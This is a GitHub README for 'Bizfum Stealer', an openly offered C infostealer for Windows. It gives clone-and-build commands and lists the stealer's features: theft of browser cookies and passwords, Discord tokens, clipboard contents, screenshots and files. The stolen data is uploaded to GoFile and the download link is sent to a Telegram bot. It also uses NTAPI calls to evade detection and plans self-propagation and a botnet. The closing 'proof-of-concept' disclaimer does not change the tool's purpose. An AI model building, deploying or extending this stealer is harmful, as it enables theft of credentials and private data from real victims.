  <strong>Bizfum Stealer</strong> is a 2024-developed open source stealer malware. It performs common data exfiltration tasks while leveraging pre-installed Windows DLLs and utilizing NTAPI for WinAPI calls, minimizing suspicion. This repository will be updated in the near future. Stars would greatly support this project!

## ‚öôÔ∏è Installation
The installation process is straightforward. Clone the repository, run the config.py and then build.(bat/sh):

**Bash**

Configure:
```bash
git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer && pip install -r requirements.txt && python config.py
```
Build:
```bash
chmod +x build.sh && ./build.sh
```

**Powershell**

Configure:
```powershell
git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git; cd Bizfum-Stealer; pip install -r requirements.txt && python config.py
```
Build:
```powershell
.\build.bat
```
**Batch**

Configure:
```cmd
git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer && pip install -r requirements.txt && python config.py
```
Build:
```cmd
build
```

## ‚ùì Purpose
With years of experience in web hacking, I ventured into malware development to explore a second facet of the hacking landscape. Bizfum Stealer serves as a proof-of-concept (PoC) and is not intended for malicious activities. While it may not be fully undetectable (FUD), creating a loader could enhance its stealth capabilities. However, I am really sure, if I shared my UD loader, it would lead into unethical uses.

My personal interest in this project stems from the lack of open-source C-based stealers on GitHub. Most available options are either outdated or poorly maintained. While languages like C++ and C# are more prevalent, I believe C remains a powerful choice for this type of development.

## ‚ú® Current Features
- Utilizes NtAPI to reduce the likelihood of detection.
- Dynamically loading pre-installed Dynamic Link Libraries of Windows.
- Captures screenshots and saves them as bitmap files.
- Extracts pictures and files based on specific names or extensions.
- Steals clipboard data.
- Captures Discord tokens.
- Stealing of Chrome and Firefox cookies + passwords.
- Zipping of stolen data -> AES Encryption of ZIP file -> RSA Encryption of AES Encryption Key.
- Uploading of encrypted data to GoFile
- Send a download link to a Telegram channel through an bot.
- Possibility of generating a new fresh RSA (CNG) key, choose own XOR key, and unique encoding of Telegram token. This is all automated by `config.py`.

## üõ†Ô∏è Coming Features
- Other browser theft.
- Self-propagation through applications such as Discord.
- Extraction of game tokens or credentials.
- Potential development of a botnet.
- Better "infected" message to Telegram.
- Machine information theft (IP, Computer Name, AD info, etc).
- More customization features to `config.py`.

## üß¨ DLLs the Stealer Takes Advantage of
- C:\Program Files\Mozilla Firefox\nss3.dll ( If Firefox is installed )
- C:\Windows\System32\winsqlite3.dll
- C:\Windows\System32\crypt32.dll
- C:\Windows\System32\bcrypt.dll
- C:\Windows\System32\ole32.dll
- C:\Windows\System32\ntdll.dll
- C:\Windows\System32\gdi32.dll

## üóÇÔ∏è Repository Structure
The repository has at the moment only a verbose version of the stealer, meaning there are quite a lot of comments and printing. Later on `Bizfum-Stealer/normal/` folder will include the same code as in `Bizfum-Stealer/verbose/`, but without any comments or printing.

Additionally, in the future you could run the `config.py` file to choose if you want to config the file as an DLL. The `config.py` file would then go ahead and edit the build.(bat/sh) file to specifically compile the files as an DLL.

### üîí Purpose of Telegram Integration

- This project may use **Telegram** for the **sole purpose of sharing a download link to data**, and **NOT** for transmitting or exposing any raw, stolen, or sensitive information directly.
- All data that may be transmitted via this project is protected by **encryption** methods:
  - Data is first encrypted using **AES (Advanced Encryption Standard)** with a **32-byte key**.
  - The AES key is then further encrypted using **RSA encryption** for additional security.

This ensures that the data itself is **unreadable** and **inaccessible** without the appropriate decryption keys.

  - Violation of any platform‚Äôs **Terms of Service** (including but not limited to Telegram and Discord).
  - Any activity prohibited by **local, national, or international laws**, including but not limited to laws on **data privacy**, **computer misuse**, or **hacking**.

The developer does **NOT support or promote** the usage of this code for **malicious actions**, including but not limited to:
- **Stealing** sensitive information without explicit consent.
- Engaging in **malicious hacking**, phishing, or exploiting vulnerabilities.
- Violation of the **Computer Fraud and Abuse Act (CFAA)**, **General Data Protection Regulation (GDPR)**, or other **data privacy and security regulations**.

If you decide to use this project in any way that **violates the law** or the **Terms of Service** of any platform, including **Telegram**, the developer is in **NO WAY LIABLE** for your actions, and you agree to **indemnify and hold harmless** the developer for any claims or damages arising out of such use.
